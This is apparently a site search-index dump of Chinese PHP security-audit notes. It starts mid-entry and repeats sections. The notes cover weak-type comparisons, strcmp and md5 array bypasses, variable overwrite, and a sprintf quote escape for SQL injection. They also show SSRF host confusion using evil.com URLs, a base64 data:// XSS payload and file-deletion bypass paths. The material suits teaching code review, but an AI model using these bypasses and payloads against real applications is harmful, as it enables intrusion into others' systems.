\u2018\u3001\u2019\\t\u2019\u3001\u2019\\n\u2019\u3001\u2019\\r\u2019\u3001\u2019\\v\u2019\u3001\u2019\\f\u2019\u3002\u800c\u2019.\u2019\u53ef\u4ee5\u51fa\u73b0\u5728\u4efb\u610f\u4f4d\u7f6e\uff0cE\u3001e\u80fd\u51fa\u73b0\u5728\u53c2\u6570\u4e2d\u95f4\uff0c\u4ecd\u53ef\u4ee5\u88ab\u5224\u65ad\u4e3a\u6570\u5b57\u3002\u4e5f\u5c31\u662f\u8bf4is_numeric(\u201c\\r\\n\\t 0.1e2\u201d) >> TRUE intval()\u51fd\u6570\u4f1a\u5ffd\u7565\u2019\u2019 \u2018\\n\u2019\u3001\u2019\\r\u2019\u3001\u2019\\t\u2019\u3001\u2019\\v\u2019\u3001\u2019\\0\u2019 \uff0c\u4e5f\u5c31\u662f\u8bf4intval(\u201c\\r\\n\\t 12\u201d) >> 12 strcmp()\u6570\u7ec4\u6bd4\u8f83\u7ed5\u8fc7 \u00b6 int strcmp ( string $str1,string $str2 ) \u53c2\u6570 str1\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002str2\u7b2c\u4e8c\u4e2a\u5b57\u7b26\u4e32\u3002\u5982\u679c str1 \u5c0f\u4e8e str2 \u8fd4\u56de < 0\uff1b \u5982\u679c str1 \u5927\u4e8e str2 \u8fd4\u56de > 0\uff1b\u5982\u679c\u4e24\u8005\u76f8\u7b49\uff0c\u8fd4\u56de 0\u3002 \u4f46\u662f\u5982\u679c\u4f20\u5165\u7684 \u4e24\u4e2a\u53d8\u91cf\u662f\u6570\u7ec4\u7684\u8bdd\uff0c\u51fd\u6570\u4f1a\u62a5\u9519\u8fd4\u56deNULL \uff0c\u5982\u679c\u53ea\u662f\u7528strcmp()==0\u6765\u5224\u65ad\u7684\u8bdd\u5c31\u53ef\u4ee5\u7ed5\u8fc7 sha1()\u3001md5() \u51fd\u6570\u4f20\u5165\u6570\u7ec4\u6bd4\u8f83\u7ed5\u8fc7 \u00b6 sha1\uff08\uff09 MD5\uff08\uff09\u51fd\u6570\u9ed8\u8ba4\u63a5\u6536\u7684\u53c2\u6570\u662f\u5b57\u7b26\u4e32\u7c7b\u578b\uff0c\u4f46\u662f\u5982\u679c\u5982\u679c \u4f20\u5165\u7684\u53c2\u6570\u662f\u6570\u7ec4\u7684\u8bdd\uff0c\u51fd\u6570\u5c31\u4f1a\u62a5\u9519\u8fd4\u56deNULL \u7c7b\u4f3c sha1(GET[\u2018name\u2032])===sha1(GET[\u2018name\u2032])===sha1(_GET[\u2018password\u2019]) \u7684\u6bd4\u8f83\u5c31\u53ef\u4ee5\u7ed5\u8fc7 eregi()\u5339\u914d\u7ed5\u8fc7 \u00b6 eregi\uff08\uff09\u9ed8\u8ba4\u63a5\u6536\u5b57\u7b26\u4e32\u53c2\u6570\uff0c\u5982\u679c\u4f20\u5165\u6570\u7ec4\uff0c\u51fd\u6570\u4f1a\u62a5\u9519\u5e76\u8fd4\u56deNULL\u3002\u540c\u65f6\u8fd8\u53ef\u4ee5%00 \u622a\u65ad\u8fdb\u884c\u7ed5\u8fc7 PHP\u53d8\u91cf\u540d\u4e0d\u80fd\u5e26\u6709\u70b9[.] \u548c\u7a7a\u683c\uff0c\u5426\u5219\u5728\u4f1a\u88ab\u8f6c\u5316\u4e3a\u4e0b\u5212\u7ebf[_] \u00b6 1 2 3 4 5 6 7 8 parse_str(\"na.me=admin&pass wd=123\",$test); var_dump($test); array(2) { [\"na_me\"]=> string(5) \"admin\" [\"pass_wd\"]=> string(3) \"123\" in_arrary()\u51fd\u6570\u9ed8\u8ba4\u8fdb\u884c\u677e\u6563\u6bd4\u8f83\uff08\u8fdb\u884c\u7c7b\u578b\u8f6c\u6362\uff09 \u00b6 1 2 in_arrary(\"1asd\",arrart(1,2,3,4)) => true in_arrary(\"1asd\",arrart(1,2,3,4),TRUE) => false \\\\(\u9700\u8981\u8bbe\u7f6estrict\u53c2\u6570\u4e3atrue\u624d\u4f1a\u8fdb\u884c\u4e25\u683c\u6bd4\u8f83\uff0c\u8fdb\u884c\u7c7b\u578b\u68c0\u6d4b) htmlspecialchars()\u51fd\u6570\u9ed8\u8ba4\u53ea\u8f6c\u4e49\u53cc\u5f15\u53f7\u4e0d\u8f6c\u4e49\u5355\u5f15\u53f7\uff0c\u5982\u679c\u90fd\u8f6c\u4e49\u7684\u8bdd\u9700\u8981\u6dfb\u52a0\u4e0a\u53c2\u6570ENT_QUOTES \u00b6 \u5728php4\u3001php<5.2.1\u4e2d\uff0c\u53d8\u91cf\u7684key\u503c\u4e0d\u53d7magic_quotes_gpc\u5f71\u54cd \u00b6 sprintf()\u683c\u5f0f\u5316\u6f0f\u6d1e\uff08\u53ef\u4ee5\u5403\u6389\u8f6c\u4e49\u540e\u7684\u5355\u5f15\u53f7 \u00b6 printf\uff08\uff09\u548csprintf\uff08\uff09\u51fd\u6570\u4e2d\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528%\u63a5\u4e00\u4e2a\u5b57\u7b26\u6765\u8fdb\u884cpadding\u529f\u80fd \u4f8b\u5982%10s \u5b57\u7b26\u4e32\u4f1a\u9ed8\u8ba4\u5728\u5de6\u4fa7\u586b\u5145\u7a7a\u683c\u81f3\u957f\u5ea6\u4e3a10\uff0c\u8fd8\u53ef\u4ee5 %010s \u4f1a\u4f7f\u7528\u5b57\u7b260\u8fdb\u884c\u586b\u5145\uff0c\u4f46\u662f\u5982\u679c\u6211\u4eec\u60f3\u8981\u4f7f\u7528\u522b\u7684\u5b57\u7b26\u8fdb\u884c\u586b\u5145\uff0c\u9700\u8981\u4f7f\u7528 \u2018 \u5355\u5f15\u53f7\u8fdb\u884c\u6807\u8bc6\uff0c\u4f8b\u5982 %\u2019#10s \u8fd9\u4e2a\u5c31\u662f\u4f7f\u7528#\u8fdb\u884c\u586b\u5145\uff08\u767e\u5206\u53f7\u4e0d\u4ec5\u4f1a\u5403\u6389\u2019\u5355\u5f15\u53f7\uff0c\u8fd8\u4f1a\u5403\u6389 \u659c\u6760\uff09 \u540c\u65f6sprintf\uff08\uff09\u53ef\u4ee5\u4f7f\u7528\u6307\u5b9a\u53c2\u6570\u4f4d\u7f6e\u7684\u5199\u6cd5 %\u540e\u9762\u7684\u6570\u5b57\u4ee3\u8868\u7b2c\u51e0\u4e2a\u53c2\u6570\uff0c$\u540e\u4ee3\u8868\u683c\u5f0f\u5316\u7c7b\u578b \u8f93\u5165\u7684\u7279\u6b8a\u5b57\u7b26\u88ab\u653e\u5230\u5f15\u53f7\u4e2d\u8fdb\u884c\u8f6c\u4e49\u65f6\uff0c\u4f46\u662f\u53c8\u4f7f\u7528\u4e86sprintf\u51fd\u6570\u8fdb\u884c\u62fc\u63a5\u65f6 \u4f8b\u5982 %1$'%s' \u4e2d\u7684 '% \u88ab\u5f53\u6210\u4f7f\u7528 % \u8fdb\u884cpadding\uff0c\u5bfc\u81f4\u540e\u4e00\u4e2a ' \u9003\u9038\u4e86 \u8fd8\u6709\u4e00\u79cd\u60c5\u51b5\u5c31\u662f ' \u88ab\u8f6c\u4e49\u6210\u4e86 \\' ,\u4f8b\u5982\u8f93\u5165 %'and 1=1# \u8fdb\u5165\uff0c\u5b58\u5728SQL\u8fc7\u6ee4\uff0c ' \u88ab\u8f6c\u6210\u4e86 \\' \u4e8e\u662fsql\u8bed\u53e5\u53d8\u6210\u4e86 select * from user where username = '%\\' and 1=1#'; \u5982\u679c\u8fd9\u4e2a\u8bed\u53e5\u88ab\u4f7f\u7528sprintf\u51fd\u6570\u8fdb\u884c\u4e86\u62fc\u63a5\uff0c % \u540e\u7684 \\ \u88ab\u5403\u6389\u4e86\uff0c\u5bfc\u81f4\u4e86 \u2019 \u9003\u9038 1 2 3 4 5 6 <?php $sql = \"select * from user where username = '%\\' and 1=1#';\" ; $args = \"admin\" ; echo sprintf ( $sql , $args ) ; //result: select * from user where username = '' and 1=1#' ?> \u4e0d\u8fc7\u8fd9\u6837\u5bb9\u6613\u9047\u5230 PHP Warning: sprintf(): Too few arguments \u7684\u62a5\u9519 \u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 %1$ \u6765\u5403\u6389\u8f6c\u79fb\u6dfb\u52a0\u7684 \\ 1 2 3 4 5 6 <?php $sql = \"select * from user where username = '%1 $\\ ' and 1=1#' and password='%s';\" ; $args = \"admin\" ; echo sprintf ( $sql , $args ) ; //result: select * from user where username = '' and 1=1#' and password='admin'; ?> php\u4e2d = \u8d4b\u503c\u8fd0\u7b97\u7684\u4f18\u5148\u7ea7\u9ad8\u4e8eand \u00b6 $c = is_numeric($a) and is_numeric($b) \u7a0b\u5e8f\u672c\u610f\u662f\u8981a\u3001b\u90fd\u4e3a\u6570\u5b57\u624d\u4f1a\u7ee7\u7eed\uff0c\u4f46\u662f\u5f53a\u4e3a\u6570\u5b57\u65f6\uff0c\u4f1a\u5148\u8d4b\u503c\u7ed9a\u4e3a\u6570\u5b57\u65f6\uff0c\u4f1a\u5148\u8d4b\u503c\u7ed9c\uff0c\u6240\u4ee5\u53ef\u80fd\u5bfc\u81f4$b\u7ed5\u8fc7\u68c0\u6d4b parse_url\u4e0elibcurl\u5bf9\u4e0eurl\u7684\u89e3\u6790\u5dee\u5f02\u53ef\u80fd\u5bfc\u81f4ssrf \u00b6 \u5f53url\u4e2d\u6709\u591a\u4e2a@\u7b26\u53f7\u65f6\uff0c parse_url\u4e2d\u83b7\u53d6\u7684host\u662f\u6700\u540e\u4e00\u4e2a@\u7b26\u53f7\u540e\u9762\u7684host\uff0c\u800clibcurl\u5219\u662f\u83b7\u53d6\u7684\u7b2c\u4e00\u4e2a@\u7b26\u53f7\u4e4b\u540e\u7684\u3002 \u56e0\u6b64\u5f53\u4ee3\u7801\u5bf9 http://user@eval.com:80@baidu.com \u8fdb\u884c\u89e3\u6790\u65f6\uff0cPHP\u83b7\u53d6\u7684host\u662fbaidu.com\u662f\u5141\u8bb8\u8bbf\u95ee\u7684\u57df\u540d\uff0c\u800c\u6700\u540e\u8c03\u7528libcurl\u8fdb\u884c\u8bf7\u6c42\u65f6\u5219\u662f\u8bf7\u6c42\u7684eval.com\u57df\u540d\uff0c\u53ef\u4ee5\u9020\u6210ssrf\u7ed5\u8fc7 \u6b64\u5916\u5bf9\u4e8e https://evil@baidu.com \u8fd9\u6837\u7684\u57df\u540d\u8fdb\u884c\u89e3\u6790\u65f6,php\u83b7\u53d6\u7684host\u662f evil@baidu.com \uff0c\u4f46\u662flibcurl\u83b7\u53d6\u7684host\u5374\u662fevil.com url\u6807\u51c6\u7684\u7075\u6d3b\u6027\u5bfc\u81f4\u7ed5\u8fc7filter_var\u4e0eparse_url\u8fdb\u884cssrf \u00b6 filter_var()\u51fd\u6570\u5bf9\u4e8e http://evil.com;google.com \u4f1a\u8fd4\u56defalse\u4e5f\u5c31\u662f\u8ba4\u4e3aurl\u683c\u5f0f\u9519\u8bef\uff0c\u4f46\u662f\u5bf9\u4e8e 0://evil.com:80;google.com:80/ \u3001 0://evil.com:80,google.com:80/ \u3001 0://evil.com:80\\google.com:80/ \u5374\u8fd4\u56detrue. \u901a\u8fc7file_get_contents\u83b7\u53d6\u7f51\u9875\u5185\u5bb9\u5e76\u8fd4\u56de\u5230\u5ba2\u6237\u7aef\u6709\u53ef\u80fd\u9020\u6210xss \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 <?php if ( filter_var ( $argv [ 1 ], FILTER_VALIDATE_URL )) { // parse URL $r = parse_url ( $argv [ 1 ]); print_r ( $r ); // check if host ends with google.com if ( preg_match ( '/baidu\\.com$/' , $r [ 'host' ])) { // get page from URL $a = file_get_contents ( $argv [ 1 ]); echo ( $a ); } else { echo \"Error: Host not allowed\" ; } } else { echo \"Error: Invalid URL\" ; } \u867d\u7136\u901a\u8fc7filter_var\u51fd\u6570\u5bf9url\u7684\u683c\u5f0f\u8fdb\u884c\u68c0\u67e5\uff0c\u5e76\u4e14\u4f7f\u7528\u6b63\u5219\u5bf9url\u7684host\u8fdb\u884c\u9650\u5b9a \u4f46\u662f\u53ef\u4ee5\u901a\u8fc7 data://baidu.com/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo= \u9875\u9762\u4f1a\u5c06 <script>alert(1)</script> \u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\uff0c\u5c31\u6709\u53ef\u80fd\u9020\u6210xss \u5f31\u7c7b\u578b \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 md5(\u2018240610708\u2019); // 0e462097431906509019562988736854 md5(\u2018QNKCDZO\u2019); // 0e830400451993494058024219903391 md5(\u2018240610708\u2019) == md5(\u2018QNKCDZO\u2019) md5(\u2018aabg7XSs\u2019) == md5(\u2018aabC9RqS\u2019) sha1(\u2018aaroZmOk\u2019) == sha1(\u2018aaK1STfY\u2019) sha1(\u2018aaO8zKZF\u2019) == sha1(\u2018aa3OFF9m\u2019) \u20180010e2\u2019 == \u20181e3\u2019 \u20180x1234Ab\u2019 == \u20181193131\u2018 \u20180xABCdef\u2019 == \u2018 0xABCdef\u2019 \u5f53\u8f6c\u6362\u4e3aboolean\u65f6\uff0c\u4ee5\u4e0b\u53ea\u88ab\u8ba4\u4e3a\u662fFALSE\uff1aFALSE\u30010\u30010.0\u3001\u201c\u201d\u3001\u201c0\u201d\u3001array()\u3001NULL 1 2 3 PHP 7 \u4ee5\u524d\u7684\u7248\u672c\u91cc\uff0c\u5982\u679c\u5411\u516b\u8fdb\u5236\u6570\u4f20\u9012\u4e86\u4e00\u4e2a\u975e\u6cd5\u6570\u5b57\uff08\u5373 8 \u6216 9\uff09\uff0c\u5219\u540e\u9762\u5176\u4f59\u6570\u5b57\u4f1a\u88ab\u5ffd\u7565\u3002var_dump(0123)=var_dump(01239)=83 PHP 7 \u4ee5\u540e\uff0c\u4f1a\u4ea7\u751f Parse Error\u3002 1 2 3 4 5 6 7 \u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u6570\u503c\u65f6\uff0c\u82e5\u5b57\u7b26\u4e32\u5f00\u5934\u6709\u6570\u5b57\uff0c\u5219\u8f6c\u4e3a\u6570\u5b57\u5e76\u7701\u7565\u540e\u9762\u7684\u975e\u6570\u5b57\u5b57\u7b26\u3002\u82e5\u4e00\u5f00\u5934\u6ca1\u6709\u6570\u5b57\u5219\u8f6c\u6362\u4e3a0 \\$foo = 1 + \u201cbob-1.3e3\u201d; // $foo is integer (1) \\$foo = 1 + \u201cbob3\u201d; // $foo is integer (1) \\$foo = 1 + \u201c10 Small Pigs\u201d; // $foo is integer (11) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u2018\u2019 == 0 == false \u2018123\u2019 == 123 \u2018abc\u2019 == 0 \u2018123a\u2019 == 123 \u20180x01\u2019 == 1 \u20180e123456789\u2019 == \u20180e987654321\u2019 [false] == [0] == [NULL] == [\u2018\u2019] NULL == false == 0\u00bb true == 1","title":"\u5ba1\u8ba1\u5c0f\u77e5\u8bc61"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#1","text":"","title":"\u5ba1\u8ba1\u5c0f\u77e5\u8bc61"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#file_put_contentscopyfile_get_contentsunlinkfile_exists","text":"1 2 3 4 5 6 7 8 9 <?php $filename = __DIR__ . '/tmp/' . $user [ 'name' ]; $data = $user [ 'info' ]; file_put_contents ( $filename , $data ); if ( file_exists ( $filename )) { unlink ( $filename ); } ?> \u67e5\u770bphp\u6e90\u7801\uff0c\u5176\u5b9e\u6211\u4eec\u80fd\u53d1\u73b0\uff0cphp\u8bfb\u53d6\u3001\u5199\u5165\u6587\u4ef6\uff0c\u90fd\u4f1a\u8c03\u7528php_stream_open_wrapper_ex\u6765\u6253\u5f00\u6d41\uff0c\u800c\u5224\u65ad\u6587\u4ef6\u5b58\u5728\u3001\u91cd\u547d\u540d\u3001\u5220\u9664\u6587\u4ef6\u7b49\u64cd\u4f5c\u5219\u65e0\u9700\u6253\u5f00\u6587\u4ef6\u6d41\u3002 \u6211\u4eec\u8ddf\u4e00\u8ddfphp_stream_open_wrapper_ex\u5c31\u4f1a\u53d1\u73b0\uff0c\u5176\u5b9e\u6700\u540e\u4f1a\u4f7f\u7528tsrm_realpath\u51fd\u6570\u6765\u5c06filename\u7ed9\u6807\u51c6\u5316\u6210\u4e00\u4e2a\u7edd\u5bf9\u8def\u5f84\u3002\u800c\u6587\u4ef6\u5220\u9664\u7b49\u64cd\u4f5c\u5219\u4e0d\u4f1a\uff0c\u8fd9\u5c31\u662f\u4e8c\u8005\u7684\u533a\u522b\u3002 \u6240\u4ee5\uff0c\u5982\u679c\u6211\u4eec\u4f20\u5165\u7684\u662f\u6587\u4ef6\u540d\u4e2d\u5305\u542b\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u8def\u5f84\uff0c\u5199\u5165\u7684\u65f6\u5019\u56e0\u4e3a\u4f1a\u5904\u7406\u6389\u201c../\u201d\u7b49\u76f8\u5bf9\u8def\u5f84\uff0c\u6240\u4ee5\u4e0d\u4f1a\u51fa\u9519\uff1b\u5224\u65ad\u3001\u5220\u9664\u7684\u65f6\u5019\u56e0\u4e3a\u4e0d\u4f1a\u5904\u7406\uff0c\u6240\u4ee5\u5c31\u4f1a\u51fa\u73b0\u201cNo such file or directory\u201d\u7684\u9519\u8bef\u3002 \u4e8e\u662f\u4e4elinux\u53ef\u4ee5\u901a\u8fc7 xxxxx/../test.php \u3001 test.php/. windows\u53ef\u4ee5\u901a\u8fc7 test.php:test test.ph< \u6765\u7ed5\u8fc7\u6587\u4ef6\u5220\u9664 \u6b64\u5916\u53d1\u73b0\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4f2a\u534f\u8bae php://filter/resource=1.php \u5728file_ge_contents\u3001copy\u7b49\u4e2d\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\uff0c\u5374\u53ef\u4ee5\u7ed5\u8fc7\u6587\u4ef6\u5220\u9664","title":"file_put_contents\u3001copy\u3001file_get_contents\u7b49\u8bfb\u53d6\u5199\u5165\u64cd\u4f5c\u4e0eunlink\u3001file_exists\u7b49\u5220\u9664\u5224\u65ad\u6587\u4ef6\u51fd\u6570\u4e4b\u95f4\u5bf9\u4e8e\u8def\u5f84\u5904\u7406\u7684\u5dee\u5f02\u5bfc\u81f4\u7684\u5220\u9664\u7ed5\u8fc7"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#extractparse_str","text":"extract\u51fd\u6570\u4ece\u6570\u7ec4\u5bfc\u5165\u53d8\u91cf\uff08 $_GET \u3001 $_POST \uff09,\u5c06\u6570\u7ec4\u7684\u952e\u540d\u4f5c\u4e3a\u53d8\u91cf\u7684\u503c\u3002\u800cparse_str\u51fd\u6570\u5219\u662f\u4ece\u7c7b\u4f3cname=Bill&age=60\u7684\u683c\u5f0f\u5b57\u7b26\u4e32\u89e3\u6790\u53d8\u91cf.\u5982\u679c\u5728\u4f7f\u7528\u7b2c\u4e00\u4e2a\u51fd\u6570\u6ca1\u6709\u8bbe\u7f6e EXTR_SKIP \u6216\u8005 EXTR_PREFIX_SAME \u7b49\u5904\u7406\u53d8\u91cf\u51b2\u7a81\u7684\u53c2\u6570\u65f6\u3001\u7b2c\u4e8c\u4e2a\u51fd\u6570\u6ca1\u6709\u4f7f\u7528\u6570\u7ec4\u63a5\u53d7\u53d8\u91cf\u65f6\u5c06\u4f1a\u5bfc\u81f4\u53d8\u91cf\u8986\u76d6\u7684\u95ee\u9898","title":"extract()\u3001parse_str() \u7b49\u53d8\u91cf\u8986\u76d6"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#intval","text":"32\u4f4d\u7cfb\u7edf\u6700\u5927\u7684\u5e26\u7b26\u53f7\u8303\u56f4\u4e3a-2147483648 \u5230 2147483647\uff0c64\u4f4d\u6700\u5927\u7684\u662f 9223372036854775807\uff0c\u56e0\u6b64\uff0c\u572832\u4f4d\u7cfb\u7edf\u4e0a intval(\u20181000000000000\u2019) \u4f1a\u8fd4\u56de 2147483647 \u6b64\u5916intval(10.99999)\u4f1a\u8fd4\u56de10\uff0cintval\u548cint\u7b49\u53d6\u6574\u90fd\u662f\u2019\u622a\u65ad\u2019\u53d6\u6574\uff0c\u5e76\u4e0d\u662f\u56db\u820d\u4e94\u5165 intval\u51fd\u6570\u8fdb\u53bb\u53d6\u6574\u65f6\uff0c\u662f\u76f4\u5230\u9047\u4e0a\u6570\u5b57\u6216\u8005\u6b63\u8d1f\u53f7\u624d\u5f00\u59cb\u8fdb\u884c\u8f6c\u6362\uff0c\u4e4b\u540e\u5728\u9047\u5230\u975e\u6570\u5b57\u6216\u8005\u7ed3\u675f\u7b26\u53f7\uff08\\0\uff09\u65f6\u7ed3\u675f\u8f6c\u6362","title":"intval()\u6574\u6570\u6ea2\u51fa\u3001\u5411\u4e0b\u53d6\u6574\u548c\u6574\u5f62\u5224\u65ad\u7684\u95ee\u9898"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#_1","text":"\u5f53\u5c0f\u6570\u5c0f\u4e8e10^-16\u540e\uff0cPHP\u5bf9\u4e8e\u5c0f\u6570\u5c31\u5927\u5c0f\u4e0d\u5206\u4e86 var_dump(1.000000000000000 == 1) >> TRUE var_dump(1.0000000000000001 == 1) >> TRUE","title":"\u6d6e\u70b9\u6570\u7cbe\u5ea6\u95ee\u9898\u5bfc\u81f4\u7684\u5927\u5c0f\u6bd4\u8f83\u95ee\u9898"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#is_numericintval","text":"is_numeric\u51fd\u6570\u5728\u5224\u65ad\u662f\u5426\u662f\u6570\u5b57\u65f6\u4f1a\u5ffd\u7565\u5b57\u7b26\u4e32\u5f00\u5934\u7684\u2019 \u2018\u3001\u2019\\t\u2019\u3001\u2019\\n\u2019\u3001\u2019\\r\u2019\u3001\u2019\\v\u2019\u3001\u2019\\f\u2019\u3002\u800c\u2019.\u2019\u53ef\u4ee5\u51fa\u73b0\u5728\u4efb\u610f\u4f4d\u7f6e\uff0cE\u3001e\u80fd\u51fa\u73b0\u5728\u53c2\u6570\u4e2d\u95f4\uff0c\u4ecd\u53ef\u4ee5\u88ab\u5224\u65ad\u4e3a\u6570\u5b57\u3002\u4e5f\u5c31\u662f\u8bf4is_numeric(\u201c\\r\\n\\t 0.1e2\u201d) >> TRUE intval()\u51fd\u6570\u4f1a\u5ffd\u7565\u2019\u2019 \u2018\\n\u2019\u3001\u2019\\r\u2019\u3001\u2019\\t\u2019\u3001\u2019\\v\u2019\u3001\u2019\\0\u2019 \uff0c\u4e5f\u5c31\u662f\u8bf4intval(\u201c\\r\\n\\t 12\u201d) >> 12","title":"is_numeric()\u4e0eintval()\u7279\u6027\u5dee\u5f02"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#strcmp","text":"int strcmp ( string $str1,string $str2 ) \u53c2\u6570 str1\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002str2\u7b2c\u4e8c\u4e2a\u5b57\u7b26\u4e32\u3002\u5982\u679c str1 \u5c0f\u4e8e str2 \u8fd4\u56de < 0\uff1b \u5982\u679c str1 \u5927\u4e8e str2 \u8fd4\u56de > 0\uff1b\u5982\u679c\u4e24\u8005\u76f8\u7b49\uff0c\u8fd4\u56de 0\u3002 \u4f46\u662f\u5982\u679c\u4f20\u5165\u7684 \u4e24\u4e2a\u53d8\u91cf\u662f\u6570\u7ec4\u7684\u8bdd\uff0c\u51fd\u6570\u4f1a\u62a5\u9519\u8fd4\u56deNULL \uff0c\u5982\u679c\u53ea\u662f\u7528strcmp()==0\u6765\u5224\u65ad\u7684\u8bdd\u5c31\u53ef\u4ee5\u7ed5\u8fc7","title":"strcmp()\u6570\u7ec4\u6bd4\u8f83\u7ed5\u8fc7"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#sha1md5","text":"sha1\uff08\uff09 MD5\uff08\uff09\u51fd\u6570\u9ed8\u8ba4\u63a5\u6536\u7684\u53c2\u6570\u662f\u5b57\u7b26\u4e32\u7c7b\u578b\uff0c\u4f46\u662f\u5982\u679c\u5982\u679c \u4f20\u5165\u7684\u53c2\u6570\u662f\u6570\u7ec4\u7684\u8bdd\uff0c\u51fd\u6570\u5c31\u4f1a\u62a5\u9519\u8fd4\u56deNULL \u7c7b\u4f3c sha1(GET[\u2018name\u2032])===sha1(GET[\u2018name\u2032])===sha1(_GET[\u2018password\u2019]) \u7684\u6bd4\u8f83\u5c31\u53ef\u4ee5\u7ed5\u8fc7","title":"sha1()\u3001md5() \u51fd\u6570\u4f20\u5165\u6570\u7ec4\u6bd4\u8f83\u7ed5\u8fc7"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#eregi","text":"eregi\uff08\uff09\u9ed8\u8ba4\u63a5\u6536\u5b57\u7b26\u4e32\u53c2\u6570\uff0c\u5982\u679c\u4f20\u5165\u6570\u7ec4\uff0c\u51fd\u6570\u4f1a\u62a5\u9519\u5e76\u8fd4\u56deNULL\u3002\u540c\u65f6\u8fd8\u53ef\u4ee5%00 \u622a\u65ad\u8fdb\u884c\u7ed5\u8fc7","title":"eregi()\u5339\u914d\u7ed5\u8fc7"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#php-_","text":"1 2 3 4 5 6 7 8 parse_str(\"na.me=admin&pass wd=123\",$test); var_dump($test); array(2) { [\"na_me\"]=> string(5) \"admin\" [\"pass_wd\"]=> string(3) \"123\"","title":"PHP\u53d8\u91cf\u540d\u4e0d\u80fd\u5e26\u6709\u70b9[.] \u548c\u7a7a\u683c\uff0c\u5426\u5219\u5728\u4f1a\u88ab\u8f6c\u5316\u4e3a\u4e0b\u5212\u7ebf[_]"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#in_arrary","text":"1 2 in_arrary(\"1asd\",arrart(1,2,3,4)) => true in_arrary(\"1asd\",arrart(1,2,3,4),TRUE) => false \\\\(\u9700\u8981\u8bbe\u7f6estrict\u53c2\u6570\u4e3atrue\u624d\u4f1a\u8fdb\u884c\u4e25\u683c\u6bd4\u8f83\uff0c\u8fdb\u884c\u7c7b\u578b\u68c0\u6d4b)","title":"in_arrary()\u51fd\u6570\u9ed8\u8ba4\u8fdb\u884c\u677e\u6563\u6bd4\u8f83\uff08\u8fdb\u884c\u7c7b\u578b\u8f6c\u6362\uff09"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#htmlspecialcharsent_quotes","text":"","title":"htmlspecialchars()\u51fd\u6570\u9ed8\u8ba4\u53ea\u8f6c\u4e49\u53cc\u5f15\u53f7\u4e0d\u8f6c\u4e49\u5355\u5f15\u53f7\uff0c\u5982\u679c\u90fd\u8f6c\u4e49\u7684\u8bdd\u9700\u8981\u6dfb\u52a0\u4e0a\u53c2\u6570ENT_QUOTES"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#php4php521keymagic_quotes_gpc","text":"","title":"\u5728php4\u3001php&lt;5.2.1\u4e2d\uff0c\u53d8\u91cf\u7684key\u503c\u4e0d\u53d7magic_quotes_gpc\u5f71\u54cd"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#sprintf","text":"printf\uff08\uff09\u548csprintf\uff08\uff09\u51fd\u6570\u4e2d\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528%\u63a5\u4e00\u4e2a\u5b57\u7b26\u6765\u8fdb\u884cpadding\u529f\u80fd \u4f8b\u5982%10s \u5b57\u7b26\u4e32\u4f1a\u9ed8\u8ba4\u5728\u5de6\u4fa7\u586b\u5145\u7a7a\u683c\u81f3\u957f\u5ea6\u4e3a10\uff0c\u8fd8\u53ef\u4ee5 %010s \u4f1a\u4f7f\u7528\u5b57\u7b260\u8fdb\u884c\u586b\u5145\uff0c\u4f46\u662f\u5982\u679c\u6211\u4eec\u60f3\u8981\u4f7f\u7528\u522b\u7684\u5b57\u7b26\u8fdb\u884c\u586b\u5145\uff0c\u9700\u8981\u4f7f\u7528 \u2018 \u5355\u5f15\u53f7\u8fdb\u884c\u6807\u8bc6\uff0c\u4f8b\u5982 %\u2019#10s \u8fd9\u4e2a\u5c31\u662f\u4f7f\u7528#\u8fdb\u884c\u586b\u5145\uff08\u767e\u5206\u53f7\u4e0d\u4ec5\u4f1a\u5403\u6389\u2019\u5355\u5f15\u53f7\uff0c\u8fd8\u4f1a\u5403\u6389 \u659c\u6760\uff09 \u540c\u65f6sprintf\uff08\uff09\u53ef\u4ee5\u4f7f\u7528\u6307\u5b9a\u53c2\u6570\u4f4d\u7f6e\u7684\u5199\u6cd5 %\u540e\u9762\u7684\u6570\u5b57\u4ee3\u8868\u7b2c\u51e0\u4e2a\u53c2\u6570\uff0c$\u540e\u4ee3\u8868\u683c\u5f0f\u5316\u7c7b\u578b \u8f93\u5165\u7684\u7279\u6b8a\u5b57\u7b26\u88ab\u653e\u5230\u5f15\u53f7\u4e2d\u8fdb\u884c\u8f6c\u4e49\u65f6\uff0c\u4f46\u662f\u53c8\u4f7f\u7528\u4e86sprintf\u51fd\u6570\u8fdb\u884c\u62fc\u63a5\u65f6 \u4f8b\u5982 %1$'%s' \u4e2d\u7684 '% \u88ab\u5f53\u6210\u4f7f\u7528 % 